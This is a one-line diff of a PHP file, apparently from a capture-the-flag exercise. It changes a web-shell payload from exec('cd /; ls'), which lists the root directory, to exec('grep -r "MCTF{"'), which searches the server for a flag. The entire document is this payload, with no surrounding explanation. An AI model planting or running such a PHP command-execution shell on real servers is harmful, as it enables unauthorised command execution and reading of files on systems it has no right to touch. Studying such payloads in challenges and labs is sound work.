@@ -1,1 +1,1 @@
-<?php echo exec('cd /; ls');?>
+<?php echo exec('grep -r "MCTF{"');?>
